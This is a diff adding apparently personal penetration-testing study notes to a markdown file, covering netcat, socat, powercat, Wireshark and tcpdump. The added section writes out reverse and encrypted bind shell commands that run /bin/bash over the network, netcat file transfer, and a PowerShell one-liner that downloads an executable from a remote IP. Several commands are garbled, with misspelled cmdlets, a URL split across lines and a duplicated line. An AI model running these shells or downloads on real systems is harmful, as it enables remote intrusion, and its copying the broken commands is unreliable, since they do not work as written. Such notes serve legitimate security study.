@@ -108,6 +108,106 @@ tail -n 3 .bash_history => to give 3 final commande in bash history
 
 ctrl + r  => to search for commande the enter to excute 
 
+##practical tools :
+
+netcat => tools for read and write in network connection using tcp/udp protocols
+
+for simple chat :
+
+nc -nlvp port_number => to open the port
+
+nc -nv ip port_number => to connect with him
+
+for transfert file :
+
+nc -nlvp port_number > name_destination => for the receiver
+
+nc -nv ip port < file  => for the sender
+
+remote administration with netcut :
+
+reverse shell :
+
+nc -nvlp 4444 -e /bin/bash => target
+
+nc -nv ip port  => attacker
+
+
+
+socat => like netcut 
+chat app:
+
+socat - TCP4:127.0.0.1:4488
+
+socat TCP4-LISTEN:4444 STDOUT
+
+send files :
+
+sudo socat TCP4-LISTEN:443,fork file:ping.txt
+
+sudo socat TCP4-LISTEN:443,fork file:ping.txt
+
+reverse shell :
+
+socat TCP4:127.0.0.1:442 EXEC:/bin/bash
+
+sudo socat -d -d TCP4-LISTEN:442 STDOUT
+
+
+
+secure reverse shell:
+
+openssl req -newkey rsa:2848 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt => generate private key and certificates
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem => for one file
+
+sudo socat OPENSSL-LISTEN:441,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+
+socat - OPENSSL:127.0.0.1:441,verify=0
+
+
+
+powerShell : in windows is programming language and commandes
+
+powershett -c "(new-object System.Net.WebCtient).DowntoadFite('http:/
+
+/18.11.8.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" => to downlaod files
+
+powercat : is netcat of powerShell
+
+
+
+Powercat Stand-Alone Payloads :
+
+
+paylaod is set of powershell commande encoded .
+ 
+
+
+wireshark :
+
+sudo wireshark 
+
+filter :
+
+net 192.168.43.0/24 => to filter for network range
+
+tcp.port == 80 => to specify tcp port
+
+we can display the stream of session : write click the follow then tcp stream
+
+tcpdump:
+
+tcpdump -r  file.pcap => reading file packet 
+
+sudo tcpdump -nX -r password_cracking_filtered.pcap => to show data 
+
+sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap => to apply filter
+
+
+
+sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap => display only the data packet
+
 
 
 
